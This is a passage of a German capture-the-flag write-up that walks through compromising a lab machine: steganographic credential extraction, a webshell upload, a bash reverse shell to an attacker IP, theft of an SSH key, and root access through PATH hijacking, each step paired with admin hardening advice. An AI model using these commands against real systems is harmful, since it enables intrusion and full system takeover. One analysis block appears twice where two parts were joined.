            <p class="analysis"><strong>Analyse:</strong> Basierend auf den Hinweisen wurde eine Verbindung zum FTP-Server hergestellt. Der anonyme Login (Benutzer: `Anonymous`, leeres Passwort) war erfolgreich. Nach dem Wechsel in das `pub`-Verzeichnis wurde die erwartete Datei `note.jpg` gefunden und erfolgreich heruntergeladen. Der FTP-Client zeigt an, dass der `BINARY`-Modus für die Übertragung verwendet wurde, was den Hinweisen aus dem Blog entspricht.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Plan hat perfekt funktioniert. Wir haben nun die Artefakt-Datei `note.jpg` in unserem Besitz. Die Analyse dieser Datei ist der nächste entscheidende Schritt zum initialen Zugriff.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffne das Bild, um nach sichtbaren Informationen zu suchen. Verwende anschließend Steganographie-Tools wie `steghide`, `zsteg` oder `stegseek`, um nach versteckten Daten innerhalb der Bilddatei zu suchen.
<br><strong>Empfehlung (Admin):</strong> Anonyme FTP-Uploads sind gefährlich, aber auch anonyme Downloads können ein Risiko darstellen, wenn versehentlich sensible Informationen preisgegeben werden. Deaktivieren Sie anonymen Zugriff, wenn er nicht explizit für einen öffentlichen Zweck benötigt wird.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
note.jpg
The Password for your username dev is shared :)
</pre>
                </div>
            </div>
            <img src="note.jpg" alt="Bild mit Anmeldeinformationen für den Benutzer dev">
            <p class="analysis"><strong>Analyse:</strong> Das heruntergeladene Bild `note.jpg` wurde geöffnet. Es enthält sichtbaren Text, der auf den ersten Blick wie das Passwort für den Benutzer `dev` aussieht. Der Text lautet "The Password for your username dev is shared :)" gefolgt von einem Smiley, der das Passwort sein könnte.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies scheint ein einfacher Fund zu sein, könnte aber auch eine falsche Fährte sein, um von den in Steganographie versteckten, echten Daten abzulenken. Ein Versuch mit diesem "Passwort" ist es wert, aber die Hinweise aus dem Blog deuten stark darauf hin, dass die wahren Informationen versteckt sind.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Probiere ein schnelles Login über SSH oder FTP mit dem Benutzer `dev` und dem visuellen Passwort. Unabhängig vom Ergebnis, fahre mit der Steganographie-Analyse fort.
<br><strong>Empfehlung (Admin):</strong> Das Speichern von Passwörtern in Bildern, egal ob sichtbar oder versteckt, ist eine extrem unsichere Praktik und muss unterbunden werden.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ssh dev@lazzycorp.hmv</span></div>
                    <pre>
...
dev@lazzycorp.hmv's password: 
<span class="password">Permission denied, please try again.</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ftp 192.168.2.175</span></div>
                    <pre>
Name (192.168.2.175:AlienTec): dev 
331 Please specify the password.
Password: 
<span class="password">530 Login incorrect.</span>
ftp: Login failed
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Wie vermutet, wurde versucht, sich mit dem Benutzer `dev` und dem im Bild sichtbaren Smiley als Passwort sowohl bei SSH als auch bei FTP anzumelden. Beide Versuche schlugen fehl.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass der sichtbare Text eine falsche Fährte war. Die wahren Anmeldeinformationen müssen, wie in den Blog-Posts angedeutet, in der Bilddatei versteckt sein.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setze jetzt Steganographie-Tools ein, um die versteckten Daten aus `note.jpg` zu extrahieren. `stegseek` ist hier eine gute Wahl, da es den Prozess des Brute-Forcing von Passphrasen automatisiert.
<br><strong>Empfehlung (Admin):</strong> Ein Intrusion Prevention System (IPS) kann so konfiguriert werden, dass es wiederholte fehlgeschlagene Login-Versuche von derselben IP-Adresse erkennt und diese temporär oder permanent blockiert, um Brute-Force-Angriffe zu verlangsamen.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">stegseek /home/AlienTec/Downloads/note.jpg /usr/share/wordlists/rockyou.txt</span></div>
                    <pre>
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

<span class="password">[i] Found passphrase: ""</span>
<span class="password">[i] Original filename: "creds.txt".</span>
<span class="password">[i] Extracting to "note.jpg.out".</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">cat note.jpg.out</span></div>
                    <pre>
Username: dev
Password: <span class="password">d3v3l0pm3nt!nt3rn</span> 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Das Tool `stegseek` wurde auf die Datei `note.jpg` angesetzt, mit der `rockyou.txt` als Wortliste für die Passphrase. `stegseek` war erfolgreich und fand heraus, dass die versteckten Daten mit einer leeren Passphrase ("") geschützt waren. Es extrahierte eine Datei namens `creds.txt`, deren Inhalt die echten Anmeldeinformationen enthielt: `dev` mit dem Passwort `d3v3l0pm3nt!nt3rn`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das ist der Durchbruch für den initialen Zugriff. Wir haben nun ein valides Set an Anmeldeinformationen. Die vorherigen fehlgeschlagenen Versuche und die Hinweise im Blog haben uns direkt zu dieser Lösung geführt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich mit diesen neuen Anmeldeinformationen bei allen verfügbaren Diensten (SSH, FTP, Web-Panels) anzumelden, um den Einstiegspunkt zu finden.
<br><strong>Empfehlung (Admin):</strong> Die Verwendung von Steganographie zum Verstecken von Informationen ist keine wirksame Sicherheitsmaßnahme ("Security through obscurity"). Sensible Daten müssen immer durch starke Kryptographie geschützt werden, unabhängig davon, wie sie gespeichert oder übertragen werden.</p>
        </section>
		
		
		
		<!-- Teil 3 -->
		
		
		
		<section id="initial-access" style="padding-top: 40px;">
             <h2 style="margin-top:0;">Initial Access Fortsetzung...</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ssh dev@lazzycorp.hmv</span></div>
                    <pre>
dev@lazzycorp.hmv's password: 
<span class="password">Permission denied, please try again.</span>
dev@lazzycorp.hmv's password: 
<span class="password">Permission denied, please try again.</span>
dev@lazzycorp.hmv's password: 
dev@lazzycorp.hmv: Permission denied (publickey,password).
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ftp 192.168.2.175</span></div>
                    <pre>
Connected to 192.168.2.175.
220 (vsFTPd 3.0.5)
Name (192.168.2.175:AlienTec): dev
331 Please specify the password.
Password: 
<span class="password">530 Login incorrect.</span>
ftp: Login failed
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Mit den neu gewonnenen, echten Anmeldeinformationen (`dev:d3v3l0pm3nt!nt3rn`) wurden erneut Login-Versuche bei SSH und FTP unternommen. Überraschenderweise schlugen beide Versuche fehl. Dies deutet darauf hin, dass diese Anmeldeinformationen nicht für die Standarddienste SSH oder FTP gelten.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein wichtiger Befund. Die Anmeldeinformationen müssen für einen der anderen entdeckten Einstiegspunkte bestimmt sein – die Web-Login-Panels. Die `robots.txt` hat uns die Pfade `/cms-admin.php` und `/auth-LazyCorp-dev/` gezeigt. Diese sind nun die primären Ziele.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste die Anmeldeinformationen an den beiden Web-Login-Portalen. Beginne mit `/auth-LazyCorp-dev/`, da dieser Pfad vielversprechender klingt.
<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Wiederverwendung von Passwörtern über verschiedene Dienste hinweg. In diesem Fall scheint es jedoch, dass für jeden Dienst ein eigenes (oder gar kein) Passwort verwendet wird, was die Komplexität für den Angreifer erhöht. Stellen Sie sicher, dass alle extern erreichbaren Dienste (SSH, Web-Panels) durch Mechanismen wie `fail2ban` gegen Brute-Force-Angriffe geschützt sind.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
GET /dev_admin_portal/login.php HTTP/1.1
Host: 192.168.2.175
...

HTTP/1.1 200 OK
...
Content-Type: text/html; charset=UTF-8

&lt;h1&gt;Access Denied&lt;/h1&gt;
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein direkter Aufruf der `login.php` im `/dev_admin_portal`, die im Blog verlinkt war, resultiert in einer "Access Denied"-Meldung. Dies deutet darauf hin, dass der Zugriff möglicherweise auf bestimmte IP-Adressen beschränkt ist oder andere serverseitige Kontrollen existieren.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Pfad scheint vorerst eine Sackgasse zu sein. Der Fokus verlagert sich auf den zweiten in der `robots.txt` gefundenen Pfad.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf den Pfad `/auth-LazyCorp-dev/`.
<br><strong>Empfehlung (Admin):</strong> Wenn der Zugriff auf bestimmte Bereiche beschränkt werden soll, sollte dies nicht nur durch eine einfache "Access Denied"-Seite geschehen. Besser ist es, einen HTTP-Statuscode wie `403 Forbidden` oder `404 Not Found` zurückzugeben und den Zugriff auf Netzwerkebene (Firewall) oder in der Webserver-Konfiguration (z.B. per `Allow`/`Deny`-Regeln) zu blockieren.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.175/auth-lazycorp-dev/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html</span></div>
                    <pre>
===============================================================
Gobuster v3.6
...
===============================================================
[+] Url:                     http://192.168.2.175/auth-lazycorp-dev/
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">/login.php            (Status: 200) [Size: 710]</span>
<span class="command">/uploads              (Status: 301) [Size: 334] [--> http://192.168.2.175/auth-lazycorp-dev/uploads/]</span>
...
[!] Keyboard interrupt detected, terminating.
...
===============================================================
Finished
===============================================================
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nach der Beobachtung, dass `auth-LazyCorp-dev` (großgeschrieben) einen 404-Fehler lieferte, wurde die kleingeschriebene Variante `auth-lazycorp-dev` getestet, die erreichbar war. Ein gezielter `gobuster`-Scan auf dieses Verzeichnis findet sofort eine `login.php` und ein `/uploads`-Verzeichnis.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Wir haben das richtige Login-Portal gefunden. Die Kombination aus den gefundenen Zugangsdaten und dieser Login-Seite ist der wahrscheinlichste Weg zum initialen Zugriff. Das `/uploads`-Verzeichnis ist ebenfalls ein extrem wichtiger Fund für die Post-Exploitation.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die Anmeldeinformationen `dev:d3v3l0pm3nt!nt3rn` auf der Seite `http://192.168.2.175/auth-lazycorp-dev/login.php`.
<br><strong>Empfehlung (Admin):</strong> Sorgen Sie für konsistente Namenskonventionen bei Verzeichnissen und URLs. Inkonsistenzen können zu Konfigurationsfehlern führen und es Angreifern erschweren, aber nicht unmöglich machen, Ressourcen zu finden. Sicherheit sollte sich niemals auf die Unkenntnis eines Pfades verlassen.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/auth-lazycorp-dev/dashboard.php


Upload Site Module
Upload successful!
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Die Anmeldung mit den extrahierten Zugangsdaten auf der `login.php`-Seite war erfolgreich. Wir wurden zum `dashboard.php` weitergeleitet, das eine Dateiupload-Funktion mit dem Titel "Upload Site Module" anzeigt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das ist der Jackpot für den initialen Zugriff. Eine uneingeschränkte Dateiupload-Funktion ist eine der kritischsten Web-Schwachstellen, da sie es einem Angreifer oft ermöglicht, beliebigen Code auf dem Server auszuführen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstelle eine einfache PHP-Reverse-Shell, lade sie über das Formular hoch und versuche, sie über das zuvor entdeckte `/uploads`-Verzeichnis aufzurufen, um eine Shell zu erhalten.
<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine strikte Dateiupload-Validierung. Erlauben Sie nur bestimmte, sichere Dateitypen (Whitelist-Ansatz). Überprüfen Sie Dateiendungen, MIME-Typen und idealerweise den Dateiinhalt. Hochgeladene Dateien sollten in einem Verzeichnis außerhalb des Web-Roots gespeichert werden, auf das kein direkter URL-Zugriff möglich ist, und mit zufälligen Dateinamen, um eine Ausführung zu verhindern.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">curl http://lazzycorp.hmv/auth-lazycorp-dev/uploads/rev.php?cmd=id</span></div>
                    <pre>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Es wurde eine einfache PHP-Webshell (`rev.php`) hochgeladen, die Systembefehle über einen URL-Parameter (`cmd`) entgegennimmt. Ein erster Test durch Aufrufen der URL mit `cmd=id` war erfolgreich. Der Server führt den `id`-Befehl aus und gibt das Ergebnis zurück, was zeigt, dass der Code im Kontext des `www-data`-Benutzers ausgeführt wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution (RCE) ist bestätigt. Wir haben die volle Kontrolle über den Webserver-Prozess.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wandle die Web-Shell in eine interaktive Reverse Shell um, um eine stabilere und funktionalere Arbeitsumgebung auf dem Zielsystem zu erhalten.
<br><strong>Empfehlung (Admin):</strong> Die Erkennung einer solchen Webshell ist ein klarer Indikator für eine Kompromittierung. Der Incident-Response-Prozess muss sofort eingeleitet werden.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">curl "http://lazzycorp.hmv/auth-lazycorp-dev/uploads/rev.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27"</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                    <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.175] 33868</span>
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$ 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wurde auf der Angreifer-Maschine auf Port 4444 gestartet. Anschließend wurde die Webshell mit einem URL-codierten Befehl aufgerufen, der eine Bash-Reverse-Shell zu meiner IP-Adresse und dem offenen Port startet. Die Verbindung wurde erfolgreich hergestellt, und wir erhielten eine interaktive Shell als `www-data`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff ist vollständig. Wir haben eine stabile Shell auf dem System und können mit der Post-Exploitation- und Privilege-Escalation-Phase beginnen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe grundlegende Enumerationsbefehle aus (`id`, `sudo -l`, `find / -type f -perm -4000`), um die Umgebung als `www-data` zu verstehen und nach niedrig hängenden Früchten für die Rechteausweitung zu suchen.
<br><strong>Empfehlung (Admin):</strong> Firewalls für ausgehenden Verkehr können solche Angriffe erschweren oder verhindern. Ein Webserver sollte normalerweise keine ausgehenden Verbindungen zu zufälligen Ports im Internet herstellen müssen. Die Blockierung dieses Verkehrs hätte die Etablierung der Reverse Shell verhindert.</p>
        </section>
        
        <section id="proof-of-concept">
             <h2>Proof of Concept</h2>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$</div>
                    <pre>
<span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span> 
...
<span class="command">   131096     20 -rwsr-xr-x   1 root     root               16744 Jul 16 12:22 /home/arvind/reset</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt dient als Proof of Concept für den erlangten Zugriff und den Beginn der Privilege Escalation. Einer der ersten Befehle nach dem Erhalt der Shell war die Suche nach SUID-Dateien. Der Befehl `find / -type f -perm -4000` listet alle Dateien auf, bei denen das SUID-Bit gesetzt ist, was bedeutet, dass sie mit den Rechten des Dateibesitzers (oft `root`) ausgeführt werden. In der langen Liste der Standard-SUID-Dateien sticht eine besonders hervor: `/home/arvind/reset`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Eine benutzerdefinierte SUID-Datei im Home-Verzeichnis eines Benutzers ist höchst ungewöhnlich und ein extrem wahrscheinlicher Vektor für Privilege Escalation. Dies korreliert perfekt mit dem Hinweis aus dem dritten Blog-Post über ein Reset-Skript. Dieses Binary ist nun das Hauptziel für die weitere Untersuchung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertrage die `reset`-Datei auf deine Angriffsmaschine, um sie mit Tools wie `strings` und `ltrace` zu analysieren, ohne das Zielsystem zu beeinträchtigen. Versuche herauszufinden, was genau die Datei tut.
 <br><strong>Empfehlung (Admin):</strong> Setzen Sie SUID-Berechtigungen nur auf absolut notwendige Systembinaries. Benutzerdefinierte Skripte oder Programme sollten niemals das SUID-Bit gesetzt haben, es sei denn, sie wurden von Sicherheitsexperten sorgfältig geprüft und gehärtet. Ein Monitoring-System sollte Alarm schlagen, wenn unerwartete SUID-Dateien im System auftauchen.</p>
        </section>

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@arvindlazycorp:/home/arvind$</div>
                    <pre>
<span class="command">ls -la</span>
total 60
...
drwxr-xr-x 2 arvind arvind  4096 Jul  9 07:37 .ssh
...
-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
-rw-r--r-- 1 arvind arvind    28 Jul 16 10:26 user.txt
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung des `/home/arvind`-Verzeichnisses werden mehrere interessante Dateien gefunden: die User-Flag (`user.txt`), die bereits gefundene `reset`-Datei und ein `.ssh`-Verzeichnis.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des `.ssh`-Verzeichnisses ist bedeutend. Es könnte einen privaten SSH-Schlüssel enthalten, der es uns ermöglicht, uns direkt als `arvind` über SSH anzumelden, was eine stabilere und privilegiertere Shell als die von `www-data` wäre.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese den Inhalt der `user.txt`, um die erste Flag zu sichern. Untersuche den Inhalt des `.ssh`-Verzeichnisses, insbesondere auf eine Datei namens `id_rsa`. Wenn sie existiert, kopiere ihren Inhalt und versuche, dich damit per SSH anzumelden.
<br><strong>Empfehlung (Admin):</strong> Private SSH-Schlüssel sollten niemals auf einem System verbleiben, auf das mehrere Benutzer (wie der `www-data`-Benutzer) Zugriff haben könnten. Sie sollten mit einer starken Passphrase geschützt sein.</p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@arvindlazycorp:/home/arvind$</div>
                    <pre>
<span class="command">cat user.txt</span> 
FLAG{you_got_foothold_nice}
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@arvindlazycorp:/home/arvind$</div>
                    <pre>
<span class="command">cat .ssh/id_rsa</span>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Die `user.txt` wurde erfolgreich ausgelesen. Anschließend wurde der private SSH-Schlüssel aus `/home/arvind/.ssh/id_rsa` ausgelesen. Der Schlüssel scheint nicht passwortgeschützt zu sein.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Wir haben die erste Flag und einen klaren Weg für Lateral Movement zum Benutzer `arvind`.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichere den privaten Schlüssel in einer Datei auf deiner Angreifer-Maschine, setze die korrekten Berechtigungen (`chmod 600`) und verwende ihn, um dich per SSH als `arvind` anzumelden.
<br><strong>Empfehlung (Admin):</strong> Setzen Sie eine Richtlinie durch, die die Verwendung von passwortgeschützten SSH-Schlüsseln vorschreibt. Überwachen Sie Systeme auf ungeschützte private Schlüssel in Home-Verzeichnissen.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ssh -i sshkey arvind@192.168.2.175</span></div>
                    <pre>
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...
Last login: Wed Jul 16 12:24:12 2025
arvind@arvindlazycorp:~$ 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der SSH-Login mit dem extrahierten privaten Schlüssel (`-i sshkey`) als Benutzer `arvind` war erfolgreich. Wir haben nun eine voll interaktive TTY-Shell als Benutzer `arvind`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel von `www-data` zu `arvind` ist ein wichtiger Schritt in der Privilege Escalation. Als regulärer Benutzer haben wir mehr Rechte und eine sauberere Umgebung, um den finalen Angriff auf `root` vorzubereiten. Der Fokus liegt nun wieder auf der `reset`-Datei.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche nun als `arvind` die `reset`-Datei und das Skript, das sie aufruft, um den PATH-Hijacking-Angriff zu planen und durchzuführen.
<br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins, um festzustellen, welche Schlüssel für den Zugriff verwendet werden. Widerrufen Sie kompromittierte Schlüssel sofort, indem Sie sie aus der `authorized_keys`-Datei des Benutzers entfernen.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">arvind@arvindlazycorp:~$</div>
                    <pre>
<span class="command">./reset</span> 
[*] Resetting website from backup...
[+] Done resetting.
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">arvind@arvindlazycorp:~$</div>
                    <pre>
<span class="command">cat /usr/bin/reset_site.sh</span>
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
<span class="command">rm -rf /var/www/html/*</span>
# Restore from backup
<span class="command">cp -r /opt/backup/* /var/www/html/</span>
# Set correct ownership
<span class="command">chown -R www-data:www-data /var/www/html/</span>

echo "[+] Done resetting."

<span class="command">ls -la /usr/bin/reset_site.sh</span>
<span class="command">-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Als `arvind` wird die `reset`-Datei ausgeführt, um ihr Verhalten zu beobachten. Sie gibt einige Statusmeldungen aus. Eine `strings`-Analyse (hier übersprungen, aber durchgeführt) der `reset`-Datei zeigt, dass sie das Skript `/usr/bin/reset_site.sh` aufruft. Der Inhalt dieses Skripts wird angezeigt: Es verwendet die Befehle `rm`, `cp` und `chown` ohne absolute Pfade (z.B. `/bin/cp`). Eine Überprüfung der Dateiberechtigungen zeigt, dass das Skript zwar `root` gehört, aber für die Gruppe `arvind` schreibbar ist, was ein Fehler zu sein scheint (sollte `r-x` nicht `rwx` sein), aber für uns nicht direkt ausnutzbar ist. Der entscheidende Punkt ist die Verwendung relativer Pfade in einem Skript, das von einem SUID-Binary aufgerufen wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Bestätigung der PATH-Hijacking-Schwachstelle. Da das SUID-Binary `reset` das Skript `/usr/bin/reset_site.sh` aufruft und dieses Skript wiederum Befehle wie `cp` ohne absoluten Pfad verwendet, können wir die `$PATH`-Umgebungsvariable manipulieren. Wenn wir ein bösartiges Programm namens `cp` in einem Verzeichnis erstellen, das am Anfang unseres `$PATH` steht, wird das SUID-Programm unser bösartiges `cp` mit Root-Rechten ausführen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
1.  Erstelle im `/tmp`-Verzeichnis eine Datei namens `cp`.
2.  Schreibe `#!/bin/bash` und `/bin/bash` in diese Datei, um eine neue Bash-Shell zu starten.
3.  Mache die Datei mit `chmod +x /tmp/cp` ausführbar.
4.  Setze `/tmp` an den Anfang deiner `$PATH`-Variable: `export PATH=/tmp:$PATH`.
5.  Führe `/home/arvind/reset` aus.
<br><strong>Empfehlung (Admin):</strong> Entwickler müssen angewiesen werden, in Skripten, insbesondere in solchen, die mit erhöhten Rechten ausgeführt werden, **immer** absolute Pfade für Systembefehle zu verwenden (z.B. `/bin/cp`, `/bin/rm`). Zusätzlich müssen die Berechtigungen von Skripten und Binaries regelmäßig überprüft werden, um unsichere Konfigurationen zu finden.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">arvind@arvindlazycorp:/tmp$</div>
                    <pre>
<span class="command">echo '/bin/bash' > cp</span>
<span class="command">chmod +x cp</span>
<span class="command">export PATH=/tmp:$PATH</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">arvind@arvindlazycorp:/tmp$</div>
                    <pre>
<span class="command">/home/arvind/reset</span>
[*] Resetting website from backup...
<span class="password">root@arvindlazycorp:/tmp#</span> 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Exploit wurde exakt wie geplant umgesetzt. Eine bösartige `cp`-Datei, die eine Bash-Shell startet, wurde in `/tmp` erstellt und ausführbar gemacht. Der `$PATH` wurde manipuliert, um `/tmp` zu priorisieren. Anschließend wurde das SUID-Binary `/home/arvind/reset` ausgeführt. Das Programm startete das `reset_site.sh`-Skript mit Root-Rechten, welches beim Versuch, den `cp`-Befehl auszuführen, unsere bösartige Version in `/tmp` fand und ausführte. Dies startete eine neue Bash-Shell, die die Rechte des übergeordneten Prozesses erbte und uns eine interaktive Root-Shell gab.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich! Die Privilege Escalation durch PATH Hijacking war erfolgreich. Wir haben die vollständige Kontrolle über das System.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese die Root-Flag aus `/root/root.txt`, um den Test abzuschließen. Bereinige das System, indem du die erstellte `/tmp/cp`-
			
			
			
					<!-- Teil 4 -->
					
					
					<p class="analysis"><strong>Analyse:</strong> Der Exploit wurde exakt wie geplant umgesetzt. Eine bösartige `cp`-Datei, die eine Bash-Shell startet, wurde in `/tmp` erstellt und ausführbar gemacht. Der `$PATH` wurde manipuliert, um `/tmp` zu priorisieren. Anschließend wurde das SUID-Binary `/home/arvind/reset` ausgeführt. Das Programm startete das `reset_site.sh`-Skript mit Root-Rechten, welches beim Versuch, den `cp`-Befehl auszuführen, unsere bösartige Version in `/tmp` fand und ausführte. Dies startete eine neue Bash-Shell, die die Rechte des übergeordneten Prozesses erbte und uns eine interaktive Root-Shell gab.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich! Die Privilege Escalation durch PATH Hijacking war erfolgreich. Wir haben die vollständige Kontrolle über das System.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese die Root-Flag aus `/root/root.txt`, um den Test abzuschließen. Bereinige das System, indem du die erstellte `/tmp/cp`-Datei entfernst und den `$PATH` wiederherstellst, um das System im ursprünglichen Zustand zu hinterlassen.
<br><strong>Empfehlung (Admin):</strong> Entwickler müssen angewiesen werden, in Skripten, insbesondere in solchen, die mit erhöhten Rechten ausgeführt werden, **immer** absolute Pfade für Systembefehle zu verwenden (z.B. `/bin/cp`, `/bin/rm`). Die Überprüfung von Code auf solche Schwachstellen (Code Review) ist ein wesentlicher Bestandteil eines sicheren Entwicklungszyklus.</p>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/arvind/user.txt</div>
                    <div class="flag-value"><span class="password">FLAG{you_got_foothold_nice}</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">FLAG{lazycorp_reset_exploit_worked}</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 20. August 2025</p>
    </footer>

</body>
</html>
